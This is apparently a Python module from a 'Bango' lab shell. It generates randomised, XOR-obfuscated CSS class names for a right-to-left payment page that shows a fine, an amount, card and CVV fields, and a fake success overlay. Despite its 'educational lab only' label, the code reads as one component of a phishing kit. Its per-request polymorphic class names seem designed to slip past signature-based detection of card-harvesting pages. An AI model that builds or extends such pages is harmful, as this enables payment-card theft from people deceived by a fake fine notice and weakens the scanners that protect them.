"""
Bango (RTL lab shell): XOR-polymorphic class map via :func:`gate_engine.build_ui_class_map`,
exposed to ``bango.html`` as ``bcls[logical]`` and optional ``data-ui-map`` / ``data-ui-key`` blob.

Educational lab only; class names in delivered HTML are still visible after render.
"""

from __future__ import annotations

import json
import secrets
from typing import Any

from backend import gate_engine

# Logical UI tokens obfuscated with the same XOR+base64url pipeline as the gate.
BANGO_CLASS_LOGICAL: tuple[str, ...] = (
    "bango-page",
    "bango-shell",
    "bango-hero",
    "bango-hero__logo",
    "bango-segments",
    "bango-seg",
    "bango-surface",
    "fine-banner",
    "fine-title",
    "fine-details",
    "amount-row",
    "amount",
    "bango-section",
    "bango-section--split",
    "bango-section__title",
    "form-group",
    "bango-form",
    "bango-field-error",
    "bango-input--error",
    "bango-field-with-icon",
    "bango-cvv-input",
    "bango-cvv-toggle",
    "row",
    "btn-submit",
    "bango-footer-lab",
    "footer--ltr",
    "bango-attempted-submit",
    "bango-success-overlay",
    "bango-success-overlay__icon",
    "bango-success-overlay__title",
    "bango-success-overlay__text",
    "bango-success-overlay__spinner",
)


def build_bango_template_context(session: Any) -> dict[str, Any]:
    """
    Per-request: random XOR key, class map, shell-guard HTML, JS lookup for
    :file:`bango-lab.js` (attempted submit + input error classes).
    """
    from backend.app import SESSION_API_CSRF, _bango_shell_inject_script_tags

    xor_key = secrets.token_hex(8)
    ui_map = gate_engine.build_ui_class_map(list(BANGO_CLASS_LOGICAL), xor_key)
    report = str(session.get(SESSION_API_CSRF) or "")
    ui_json = json.dumps(ui_map, ensure_ascii=False, separators=(",", ":"))
    return {
        "bcls": ui_map,
        "bango_xor_key": xor_key,
        "bango_ui_map_json": ui_json,
        "bango_shell_inject": _bango_shell_inject_script_tags(report),
        "bango_ui_for_js": {
            "formId": ui_map["bango-form"],
            "attemptedSubmit": ui_map["bango-attempted-submit"],
            "inputError": ui_map["bango-input--error"],
        },
    }
